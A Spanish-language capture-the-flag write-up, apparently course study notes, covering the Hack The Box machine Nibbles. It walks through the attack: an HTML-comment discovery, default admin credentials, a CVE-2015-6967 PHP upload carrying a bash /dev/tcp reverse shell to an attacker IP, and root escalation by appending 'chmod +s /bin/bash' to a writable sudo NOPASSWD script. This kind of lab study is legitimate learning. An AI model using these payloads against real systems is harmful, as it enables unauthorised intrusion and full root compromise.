| **Campo** | **Detalle** |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| **MÃ¡quina** | Nibbles (Hack The Box) |
| **Autor** | Chema Marmol |
| **Fecha** | 05/07/2026 |
| **Dificultad** | FÃ¡cil / Media |
| **Temas** | CVE-2015-6967 (Nibbleblog File Upload) Â· Comentarios HTML Â· sudo NOPASSWD + script escribible Â· SUID bash |

| |
|---|
|â„¹ **INFO**<br><br>MÃ¡quina clÃ¡sica de HTB que encadena: descubrimiento vÃ­a comentario HTML â†’ login por defecto en Nibbleblog â†’ file upload (plugin My Image) â†’ RCE â†’ shell como nibbler â†’ escalada via `sudo NOPASSWD` en script con permisos 777 â†’ SUID en `/bin/bash`.|

# 1. Objetivos de la sesiÃ³n

â€¢ Explotar **CVE-2015-6967** en Nibbleblog v4.0.3 (Arbitrary File Upload en plugin *My Image*).

â€¢ Usar **comentarios HTML** como vector de descubrimiento de rutas ocultas.

â€¢ Obtener **RCE** subiendo webshell PHP que el CMS acepta pese a warnings de imagen.

â€¢ Escalar privilegios vÃ­a **`sudo NOPASSWD` sobre script escribible** (`monitor.sh` 777) â†’ `chmod u+s /bin/bash` â†’ `bash -p`.

# 2. Conceptos clave

## 2.1. CVE-2015-6967 â€” Nibbleblog Arbitrary File Upload

**Nibbleblog v4.0.3** (codename *Coffee*, 2014) permite al administrador subir archivos a travÃ©s del plugin **My Image**. La validaciÃ³n **no comprueba la extensiÃ³n real**: acepta ficheros `.php` aunque muestre warnings de "error de imagen".

| Detalle | Valor |
| :--- | :--- |
| Plugin vulnerable | *My Image* |
| Endpoint de subida | `/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image` |
| Fichero resultante | `content/private/plugins/my_image/image.php` (ejecutable vÃ­a web) |
| Permisos resultantes | Usuario del servidor web (www-data / nibbler) |

> âœ“ **Clave** 
> Los **warnings de imagen no bloquean la subida**: el fichero PHP queda guardado y es ejecutable accediendo a su URL directa.

## 2.2. Comentarios HTML como vector de descubrimiento

Los comentarios HTML (`<!-- ... -->`) son visibles en el **cÃ³digo fuente** pero no se renderizan. Desarrolladores descuidados dejan:

- Rutas internas (`/nibbleblog/`, `/admin.php`)
- Versiones de CMS / frameworks
- Notas tÃ©cnicas, TODOs, credenciales

> âœ“ **Regla** 
> **Siempre** `curl -s http://IP/ | grep -i "<!--"` o `Ver cÃ³digo fuente` en navegador. Es OSINT pasivo, no toca el servidor mÃ¡s que un GET normal.

## 2.3. `sudo NOPASSWD` sobre archivo escribible

Cuando `sudoers` permite ejecutar un script como root **sin contraseÃ±a** (`NOPASSWD`) y **ese script es escribible por el usuario actual**, el atacante puede:

1. AÃ±adir comandos al final del script (`echo 'cmd' >> script.sh`).
2. Ejecutarlo con `sudo ./script.sh` â†’ los comandos aÃ±adidos corren **como root**.

En Nibbles:
- Script: `/home/nibbler/personal/monitor.sh`
- Permisos: **777** (`rwxrwxrwx`) â†’ escribible por `nibbler`.
- `sudo -l` muestra: `(root) NOPASSWD: /home/nibbler/personal/monitor.sh`

**Payload**: `echo 'chmod +s /bin/bash' >> monitor.sh` â†’ `sudo ./monitor.sh` â†’ `/bin/bash` queda con **SUID** â†’ `bash -p` = root.

# 3. Kill Chain â€” VisiÃ³n general

```
Nmap (full TCP) â†’ curl (cÃ³digo fuente) â†’ comentario HTML â†’ /nibbleblog/
 â†“
Gobuster en /nibbleblog/ â†’ README â†’ versiÃ³n 4.0.3 â†’ CVE-2015-6967
 â†“
Login admin (admin:nibbles) â†’ Plugin My Image â†’ subida shell.php â†’ image.php
 â†“
Reverse shell (bash /dev/tcp) â†’ listener nc â†’ TTY upgrade (python3 pty)
 â†“
Flag user â†’ sudo -l â†’ monitor.sh (777, NOPASSWD) â†’ chmod +s /bin/bash
 â†“
bash -p â†’ root â†’ flag root
```

# 4. Desarrollo tÃ©cnico paso a paso

## 4.1. Escaneo completo

```bash
nmap -p- -sCV --min-rate 5000 <IP>
```

**Resultado**: solo **puerto 80 (HTTP)** y **22 (SSH)** abiertos.

## 4.2. Descubrimiento vÃ­a comentario HTML

```bash
curl -s http://<IP>/ | grep -i "<!--"
# O: curl -s http://<IP>/ | less (buscar manualmente)
```

**Salida** (fragmento):
```html
<!-- /nibbleblog/ - Nibbleblog installation -->
```

â†’ Ruta oculta del CMS: **`/nibbleblog/`**

## 4.3. EnumeraciÃ³n de `/nibbleblog/`

```bash
gobuster dir -u http://<IP>/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Hallazgos clave**:
- `admin.php` â†’ panel de login
- `README` â†’ confirma **Nibbleblog v4.0.3 (Coffee, 2014)** â†’ vulnerable a **CVE-2015-6967**
- `content/private/plugins/my_image/` â†’ directorio del plugin vulnerable

## 4.4. Login por defecto

Credenciales deducidas del nombre del CMS y la mÃ¡quina:

| Usuario | ContraseÃ±a |
| :--- | :--- |
| `admin` | `nibbles` |

Acceso a `/nibbleblog/admin.php` â†’ panel de administraciÃ³n.

## 4.5. Subida de webshell (Plugin My Image)

1. **Plugins** â†’ **My Image** â†’ **Configure**.
2. Crear `shell.php` en Kali:
 ```php
 <?php
 // Reverse shell bash via /dev/tcp
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.82/4444 0>&1'");
 ?>
 ```
 > **IP/puerto**: ajustar a tu Kali (`ip a` â†’ tun0/eth0) y puerto libre (ej. 4444).
3. Subir `shell.php` como "imagen" en el plugin.
4. Nibbleblog muestra **warnings de error de imagen** pero **guarda el fichero** como:
 ```
 /nibbleblog/content/private/plugins/my_image/image.php
 ```

## 4.6. EjecuciÃ³n de la reverse shell

**En Kali (listener)**:
```bash
nc -lvnp 4444
```

**En navegador / curl** (dispara la shell):
```bash
curl "http://<IP>/nibbleblog/content/private/plugins/my_image/image.php"
```

**Resultado**: conexiÃ³n entrante en `nc` â†’ shell como **nibbler** (usuario del servicio web).

## 4.7. EstabilizaciÃ³n de la shell (TTY upgrade)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter Ã—2
export TERM=xterm
```

## 4.8. Flag de usuario y enumeraciÃ³n sudo

```bash
cd /home/nibbler
cat user.txt
# FLAG USER

sudo -l
```

**Salida `sudo -l`**:
```
User nibbler may run the following commands on Nibbles:
 (root) NOPASSWD: /home/nibbler/personal/monitor.sh
```

## 4.9. AnÃ¡lisis de `monitor.sh`

```bash
ls -la personal/
# personal.zip â†’ descomprimir
unzip personal.zip
ls -la personal/monitor.sh
# -rwxrwxrwx 1 nibbler nibbler ... monitor.sh (777 !)
cat personal/monitor.sh
# Script simple, probablemente hace backup / monitorizaciÃ³n
```

## 4.10. Escalada: inyectar SUID en bash

```bash
# AÃ±adir comando al final (>> = append, NO > que sobreescribe)
echo 'chmod +s /bin/bash' >> personal/monitor.sh

# Ejecutar como root via sudo NOPASSWD
sudo ./personal/monitor.sh

# Verificar SUID
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash (s en owner = SUID)

# Shell root
bash -p
# whoami â†’ root
cat /root/root.txt
# FLAG ROOT
```

> âš  **CRÃTICO** 
> Usar **`>>` (append)**, nunca `>` (sobrescribe). `>` destruye el script original y podrÃ­as romper la persistencia o alertar al admin. `>>` aÃ±ade al final sin tocar lo anterior.

# 5. Herramientas utilizadas en la sesiÃ³n

| Herramienta | Objetivo | Fase | Comando / Uso | Nivel | Notas |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Nmap | Escaneo puertos + versiones | Reconocimiento | `nmap -p- -sCV --min-rate 5000 <IP>` | Recurrente | Solo 80 y 22 |
| curl / grep | Descubrir comentario HTML | Enum. pasiva | `curl -s http://IP/ | grep -i "<!--"` | Practicada | DescubriÃ³ `/nibbleblog/` |
| Gobuster | Enum. directorios en CMS | Enum. web | `gobuster dir -u http://IP/nibbleblog/ -w common.txt -x php,txt` | Practicada | README + admin.php |
| Nibbleblog (admin) | Login + file upload | ExplotaciÃ³n | `admin:nibbles` â†’ My Image plugin | Practicada | CVE-2015-6967 |
| Netcat (nc) | Listener reverse shell | Acceso | `nc -lvnp 4444` | Recurrente | Base de toda shell |
| bash /dev/tcp | Reverse shell payload | ExplotaciÃ³n | `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | Practicada | Sin dependencias externas |
| Python3 pty | TTY upgrade | Post-explotaciÃ³n | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Practicada | 3 pasos clÃ¡sicos |
| sudo -l | Enum. privilegios | Escalada | `sudo -l` | Recurrente | NOPASSWD en monitor.sh |
| unzip | Descomprimir personal.zip | Escalada | `unzip personal.zip` | Practicada | Script dentro |
| chmod / bash -p | SUID bash â†’ root | Escalada final | `echo 'chmod +s /bin/bash' >> monitor.sh; sudo ./monitor.sh; bash -p` | Practicada | PatrÃ³n clÃ¡sico |

# 6. Errores comunes y buenas prÃ¡cticas

| |
|---|
|âš  **AVISO**<br><br>**Comentarios HTML â‰  basura**. Son inteligencia pasiva gratis**. Siempre revisar `curl -s URL | grep "<!--"` o "Ver cÃ³digo fuente".|

| |
|---|
|âš  **AVISO**<br><br>**File upload con warnings â‰  bloqueado**. Nibbleblog (y muchos CMS/plugins) muestran error de validaciÃ³n de imagen **pero guardan el fichero**. Verificar siempre accediendo a la URL resultante.|

| |
|---|
|âš  **AVISO**<br><br>**`>>` vs `>` en escalada**. `>` sobrescribe y rompe el script legÃ­timo. `>>` aÃ±ade al final y preserva funcionalidad original. **Siempre `>>`**.|

| |
|---|
|âœ“ **BUENA PRÃCTICA**<br><br>**Credenciales por defecto / deducciÃ³n**: `admin:admin`, `admin:nibbles`, `nibbler:nibbles`... Probar combinaciones obvias antes de fuerza bruta. Ahorra horas.|

| |
|---|
|âœ“ **BUENA PRÃCTICA**<br><br>**`sudo -l` en cada usuario nuevo**. Es el comando Ãºnico que te dice "por dÃ³nde subir". AquÃ­ revelÃ³ `monitor.sh` 777 + NOPASSWD.|

| |
|---|
|â„¹ **Permisos 777 en script + sudo NOPASSWD = regalÃ­a de root**<br><br>Es una configuraciÃ³n errÃ³nea clÃ¡sica: script de "monitorizaciÃ³n/backup" que root ejecuta periÃ³dicamente (cron) o a demanda, pero dejÃ³ permisos abiertos. **Siempre revisar permisos de lo que sudo te deja tocar**.|

# 7. ConexiÃ³n con sesiones anteriores

â€¢ **CVE-2015-6967 / File Upload**: mismo patrÃ³n que **Mr. Robot** (WP theme editor â†’ 404.php) y **Oopsie** (IDOR â†’ upload â†’ webshell). La diferencia: aquÃ­ el CMS *es* el vector, no un plugin de WP.

â€¢ **Comentarios HTML**: visto en sesiones de enumeraciÃ³n web / OSINT (Reactor, Rockstar, enumeraciÃ³n web genÃ©rica).

â€¢ **Reverse shell bash /dev/tcp**: patrÃ³n recurrente (Oopsie, Archetype, Mr. Robot, Nike). No requiere `nc` ni `python` en la vÃ­ctima.

â€¢ **TTY upgrade (python3 pty + stty)**: estÃ¡ndar en **todas** las mÃ¡quinas Linux del mÃ¡ster desde HTB Starting Point.

â€¢ **sudo NOPASSWD + script escribible**: visto en **Banco** (`chattr` + cron), **Rockstar** (cron + SUID), **Nike** (logrotate/dd). AquÃ­ es **script 777 + NOPASSWD** â†’ inyecciÃ³n directa.

â€¢ **SUID bash + `bash -p`**: patrÃ³n maestro de escalada Linux (Nibbles, Oopsie, Archetype vÃ­a xp_cmdshell distinto, Mr. Robot nmap SUID, Reactor CDP â†’ chmod u+s /bin/bash). **Dominar este patrÃ³n es obligatorio**.

# 8. Resumen del ataque

La mÃ¡quina **Nibbles (HTB)** se resuelve en una cadena limpia:

1. **Reconocimiento pasivo**: `curl` + grep comentario HTML â†’ descubre `/nibbleblog/`.
2. **EnumeraciÃ³n CMS**: Gobuster â†’ `README` (v4.0.3) + `admin.php` â†’ **CVE-2015-6967**.
3. **Acceso admin**: credenciales por defecto `admin:nibbles`.
4. **RCE via File Upload**: Plugin *My Image* acepta `shell.php` pese a warnings â†’ guarda `image.php` ejecutable.
5. **Reverse shell**: payload `bash /dev/tcp` â†’ listener `nc` â†’ shell como `nibbler`.
6. **TTY upgrade** â†’ shell usable.
7. **Flag user** + `sudo -l` â†’ `monitor.sh` (777, NOPASSWD root).
8. **InyecciÃ³n**: `echo 'chmod +s /bin/bash' >> monitor.sh` â†’ `sudo ./monitor.sh`.
9. **Root**: `bash -p` â†’ flag root.

Conceptos transversales: **descubrimiento pasivo**, **CVE clÃ¡sico en CMS antiguo**, **file upload bypass validaciÃ³n**, **reverse shell pura bash**, **sudo NOPASSWD + escritura = root**, **SUID bash persistente**.

# 9. Checklist de repaso

â˜ Â¿Reviso **siempre** comentarios HTML (`curl | grep "<!--"`) en la home y pÃ¡ginas clave?

â˜ Â¿SÃ© identificar **Nibbleblog** y su versiÃ³n vÃ­a `README` / `CHANGELOG` / `admin.php`?

â˜ Â¿Conozco el **CVE-2015-6967** (My Image plugin) y sÃ© que los warnings **no bloquean** la subida?

â˜ Â¿SÃ© construir una **reverse shell bash** con `/dev/tcp` sin dependencias externas?

â˜ Â¿Hago **TTY upgrade** (pty â†’ Ctrl+Z â†’ stty raw -echo; fg) **siempre** tras reverse shell?

â˜ Â¿Ejecuto `sudo -l` **inmediatamente** tras conseguir usuario nuevo?

â˜ Â¿Detecto scripts **escribibles** con `NOPASSWD` en `sudo -l` y sÃ© inyectar con `>>`?

â˜ Â¿SÃ© por quÃ© **`bash -p`** mantiene euid=0 tras SUID en `/bin/bash`?

â˜ Â¿Distinguo `>>` (append, seguro) de `>` (sobrescribe, peligroso) en escaladas?

# 10. ActualizaciÃ³n del registro de herramientas

Bloque copiable a la base de conocimiento del proyecto:

| Herramienta | Nivel | Cambio |
| :--- | :--- | :--- |
| Comentarios HTML (descubrimiento) | **Practicada** | Vector pasivo obligatorio en enum. web |
| Nibbleblog / CVE-2015-6967 | **Introducida** | File upload en plugin My Image â†’ RCE |
| Reverse shell bash `/dev/tcp` | **Practicada** | Payload sin nc/python en vÃ­ctima |
| sudo NOPASSWD + script 777 | **Practicada** | Escalada por inyecciÃ³n en script root |
| `bash -p` (SUID bash) | **Reforzada** | PatrÃ³n maestro escalada Linux |

---

**Fin de apuntes â€” Nibbles (HTB) Â· Chema Marmol Â· 05/07/2026**

â†’

â†’

â†’

